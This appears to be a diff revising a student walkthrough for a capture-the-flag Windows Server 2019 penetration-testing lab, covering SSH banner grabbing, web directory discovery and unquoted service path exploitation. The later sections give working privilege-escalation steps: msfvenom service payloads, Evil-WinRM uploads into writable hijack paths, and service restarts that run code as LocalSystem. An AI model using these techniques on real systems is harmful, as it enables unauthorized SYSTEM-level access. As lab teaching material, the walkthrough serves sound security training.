@@ -1,4 +1,4 @@
-# Windows Server 2019 Lab - Complete Student Walkthrough
+# Windows Server 2019 Lab - Complete Student Walkthrough (v5)
 ## A Comprehensive Penetration Testing Learning Journey
 
 > **Educational Purpose**: This walkthrough is designed to teach Windows Server penetration testing methodology. Each step includes detailed explanations of WHY we use specific tools and techniques, helping you understand the underlying principles rather than just memorizing commands.
@@ -215,39 +215,41 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 ### Step 1.2: Service Banner Grabbing
 
-#### Manual Banner Grabbing - Understanding the Protocol
+#### Banner Grabbing - Understanding the Protocol
+
+The SSH login banner (where this flag lives) is **not** the version string. When you connect, the server first sends one cleartext line — its version identifier (`SSH-2.0-OpenSSH_for_Windows_...`). The *banner* text ("Welcome…/FLAG…") is sent later, as an encrypted `SSH_MSG_USERAUTH_BANNER` message during the login phase. Only a real **SSH client** performs the key exchange needed to receive and display it — so use `ssh`, and the banner prints **before** the password prompt:
 
 ```bash
-# Connect directly to SSH service
+# Connect with an SSH client; the banner appears before you're prompted for a password.
+# Any username works to trigger the banner (auth will simply fail afterward).
 ┌──(kali㉿kali)-[~]
-└─$ nc -nv 192.168.148.101 22
+└─$ ssh nobody@192.168.148.101
 ```
 
 **Output**:
 ```
-(UNKNOWN) [192.168.148.101] 22 (ssh) open
-SSH-2.0-OpenSSH_for_Windows_8.1
 Welcome to Vulnerable SSH Server
 FLAG{Z************1}
+nobody@192.168.148.101's password:
 ```
 
 **FLAG 18 FOUND**: FLAG{Z**********1} - SSH Banner
 
-**Why Manual Banner Grabbing?**: Automated tools might miss custom banners or additional information. Direct connection shows exactly what the service presents.
+> **Why not `nc`?** Raw netcat (`nc -nv <ip> 22`) only ever shows the first cleartext line — the version string (`SSH-2.0-OpenSSH_for_Windows_7.7` on an in-box Server 2019 build, or `8.1` if the lab was built with `-UpgradeOpenSSH`). It never performs the key exchange, so it never receives the `USERAUTH_BANNER` where the flag is. The version number is cosmetic; **the flag is in the banner, and only an SSH client shows it.**
 
-#### Alternative Banner Grabbing Methods
+#### Alternative Methods — version string only (no flag)
 
 ```bash
-# Using telnet (more interactive)
+# telnet / nc / nmap all show the VERSION STRING, not the login banner.
 ┌──(kali㉿kali)-[~]
 └─$ telnet 192.168.148.101 22
 
-# Using nmap specifically for banners
+# nmap version detection
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sV --script=banner 192.168.148.101 -p22
 ```
 
-**Learning Point**: Services often leak information in banners - version numbers, custom messages, or in CTFs, flags! Always check service banners manually.
+**Learning Point**: Distinguish the two things a service can present. The **version string** (what telnet/nc/nmap grab) is sent in cleartext before authentication and is great for fingerprinting. The **SSH login banner** (this lab's Flag 18) is a *post-key-exchange* `USERAUTH_BANNER` message — you need an actual `ssh` client to see it. Always check *both*, and know which tool reveals which.
 
 ---
 
@@ -407,27 +409,31 @@ DESCRIPTION: Weak Permission Service - FLAG{D************2}
 
 #### Step 1: Identify Web Directories
 
+Start by simply requesting the site root. This server has **directory browsing enabled** and no default document, so `/` returns a listing — and the landing page also links straight to the app. (A dictionary sweep like `gobuster dir -w common.txt` will **miss** this app, because "vulnapp" isn't in `common.txt`. Always look at what the root actually serves before brute-forcing.)
+
 ```bash
-# Directory enumeration with gobuster
+# Just look at the site root first
 ┌──(kali㉿kali)-[~]
-└─$ gobuster dir -u http://192.168.148.101 -w /usr/share/wordlists/dirb/common.txt
+└─$ curl -s http://192.168.148.101/
 ```
 
 **Output**:
+```html
+<html>
+<head><title>Internal Web Portal</title></head>
+<body>
+<h1>Internal Web Portal</h1>
+<!-- Application moved to /vulnapp/ -->
+<ul>
+  <li><a href="/vulnapp/login.html">Application Login</a></li>
+</ul>
+</body>
+</html>
 ```
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.148.101
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-[+] Status codes:            200,204,301,302,307,401,403
-===============================================================
-/vulnapp              (Status: 301) [Size: 153] [--> http://192.168.148.101/vulnapp/]
-===============================================================
-```
+
+The homepage names `/vulnapp/` in both a link and an HTML comment. If directory browsing is on you'll also see `vulnapp/` in the raw folder listing. Either way, no wordlist needed.
+
+> **Optional — if you still want to brute-force:** a *content*-aware wordlist finds it where `common.txt` cannot, e.g. `gobuster dir -u http://192.168.148.101 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`. The lesson: your wordlist can only find words it contains.
 
 #### Step 2: Analyze Source Code
 
@@ -991,10 +997,12 @@ FLAG{M***********9}
 ```
 Name              DisplayName                    PathName
 ----              -----------                    --------
-VulnScanner       Vulnerable Scanner Service     C:\Program Files\Vulnerable Scanner\bin\scanner.bat
-CommonAppService  Common Application Service     C:\Program Files\Common Application\System Tools\service.exe
+VulnScanner       Vulnerable Scanner Service     C:\Program Files\Vulnerable Scanner\Scanner Service\scanner.exe
+CommonAppService  Common Application Service     C:\Program Files\Common Application\System Tools\app service.exe
 VendorUpdater     Vendor Update Service          C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.exe
 ```
+
+> **Note:** each `PathName` is **unquoted**, contains a space, and ends in `.exe` (a `.bat` can never be a service binary — the SCM only launches `.exe`). The legitimate target exe is intentionally **absent**, so each service is "broken" until you hijack it — exactly the condition that makes an unquoted path exploitable.
 
 ### FLAG 13: VulnScanner Unquoted Path
 
@@ -1010,30 +1018,51 @@ VendorUpdater     Vendor Update Service          C:\Program Files (x86)\Vendor S
 SERVICE_NAME: VulnScanner
         TYPE               : 10  WIN32_OWN_PROCESS
         START_TYPE         : 2   AUTO_START
-        BINARY_PATH_NAME   : C:\Program Files\Vulnerable Scanner\bin\scanner.bat
+        BINARY_PATH_NAME   : C:\Program Files\Vulnerable Scanner\Scanner Service\scanner.exe
         DISPLAY_NAME       : Vulnerable Scanner Service
 ```
 
-**The Vulnerability**: Windows will try to execute:
+**The Vulnerability**: the path is unquoted and contains spaces, so on start the SCM search-walks each space-split prefix, appending `.exe`, and launches the first one that exists:
 1. `C:\Program.exe`
 2. `C:\Program Files\Vulnerable.exe`
-3. `C:\Program Files\Vulnerable Scanner\bin\scanner.bat`
+3. **`C:\Program Files\Vulnerable Scanner\Scanner.exe`**  ← *you can write here*
+4. `C:\Program Files\Vulnerable Scanner\Scanner Service\scanner.exe` (the intended, absent target)
 
-**Exploitation**:
+Check where you can plant a payload — the base directory is writable by `BUILTIN\Users`:
+
 ```powershell
-# Create malicious executable
-*Evil-WinRM* PS C:\> echo "echo FLAG > C:\flag_unquoted1.txt" > "C:\Program Files\Vulnerable.bat"
+*Evil-WinRM* PS C:\> icacls "C:\Program Files\Vulnerable Scanner"
+C:\Program Files\Vulnerable Scanner BUILTIN\Users:(OI)(CI)(M)
+                                    ...
 
-# Restart the service
-*Evil-WinRM* PS C:\> Stop-Service VulnScanner -Force
-*Evil-WinRM* PS C:\> Start-Service VulnScanner
+# The reward flag sits right there, but it's SYSTEM-only readable — you can see it, not read it (yet):
+*Evil-WinRM* PS C:\> type "C:\Program Files\Vulnerable Scanner\scanner_flag.txt"
+Access to the path ... is denied.
+```
 
-# Check for flag
-*Evil-WinRM* PS C:\> Get-Content C:\flag_unquoted1.txt
+**Exploitation** — plant a service **`.exe`** (a `.bat` will not work; the SCM only launches real service binaries). Build a payload that copies the SYSTEM-only flag somewhere you can read, drop it at the hijack path, then start the service (it runs as `LocalSystem`):
+
+```bash
+# On Kali — generate an exe-service payload that copies the flag out to a readable location
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/exec \
+      CMD='cmd /c copy "C:\Program Files\Vulnerable Scanner\scanner_flag.txt" C:\Users\Public\u1.txt' \
+      -f exe-service -o Scanner.exe
+```
+
+```powershell
+# Upload Scanner.exe to the writable hijack directory (earlier in the search order)
+*Evil-WinRM* PS C:\> upload Scanner.exe "C:\Program Files\Vulnerable Scanner\Scanner.exe"
+
+# Start the service -> LocalSystem runs YOUR Scanner.exe -> copies the flag out
+*Evil-WinRM* PS C:\> Start-Service VulnScanner    # (service control error is expected — the payload still ran)
+
+# Read the flag from the world-readable copy
+*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\u1.txt
 FLAG{E************0}
 ```
 
-**FLAG 13 FOUND**: FLAG{E**********0} - Unquoted service path
+**FLAG 13 FOUND**: FLAG{E**********0} - Unquoted service path *(obtained only by exploiting the path — the flag file itself is unreadable without SYSTEM)*
 
 ### FLAG 14: CommonAppService Unquoted Path
 
@@ -1041,16 +1070,25 @@ FLAG{E************0}
 **Difficulty**: Medium
 
 ```powershell
-# Similar process for CommonAppService
+# Same technique. Confirm the unquoted path and the writable hijack directory:
 *Evil-WinRM* PS C:\> sc.exe qc CommonAppService
+        BINARY_PATH_NAME   : C:\Program Files\Common Application\System Tools\app service.exe
+# Hijack path (writable by Users, earlier in search order): C:\Program Files\Common Application\System.exe
+# Reward flag (SYSTEM-only): C:\Program Files\Common Application\commonapp_flag.txt
+```
 
-# Create exploit
-*Evil-WinRM* PS C:\> echo "echo FLAG > C:\flag_unquoted2.txt" > "C:\Program Files\Common.bat"
+```bash
+# Kali — payload copies this service's flag out
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/exec \
+      CMD='cmd /c copy "C:\Program Files\Common Application\commonapp_flag.txt" C:\Users\Public\u2.txt' \
+      -f exe-service -o System.exe
+```
 
-# Trigger
-*Evil-WinRM* PS C:\> Restart-Service CommonAppService -Force
-
-*Evil-WinRM* PS C:\> Get-Content C:\flag_unquoted2.txt
+```powershell
+*Evil-WinRM* PS C:\> upload System.exe "C:\Program Files\Common Application\System.exe"
+*Evil-WinRM* PS C:\> Start-Service CommonAppService
+*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\u2.txt
 FLAG{V***************8}
 ```
 
@@ -1062,12 +1100,24 @@ FLAG{V***************8}
 **Difficulty**: Medium
 
 ```powershell
-# For Program Files (x86)
-*Evil-WinRM* PS C:\> echo "echo FLAG > C:\flag_unquoted3.txt" > "C:\Program Files (x86)\Vendor.bat"
+# Same technique, this one under Program Files (x86):
+*Evil-WinRM* PS C:\> sc.exe qc VendorUpdater
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.exe
+# Hijack path (writable by Users): C:\Program Files (x86)\Vendor Software Suite\Update.exe
+# Reward flag (SYSTEM-only):       C:\Program Files (x86)\Vendor Software Suite\vendor_flag.txt
+```
 
-*Evil-WinRM* PS C:\> Restart-Service VendorUpdater -Force
+```bash
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/exec \
+      CMD='cmd /c copy "C:\Program Files (x86)\Vendor Software Suite\vendor_flag.txt" C:\Users\Public\u3.txt' \
+      -f exe-service -o Update.exe
+```
 
-*Evil-WinRM* PS C:\> Get-Content C:\flag_unquoted3.txt
+```powershell
+*Evil-WinRM* PS C:\> upload Update.exe "C:\Program Files (x86)\Vendor Software Suite\Update.exe"
+*Evil-WinRM* PS C:\> Start-Service VendorUpdater
+*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\u3.txt
 FLAG{J************0}
 ```
 
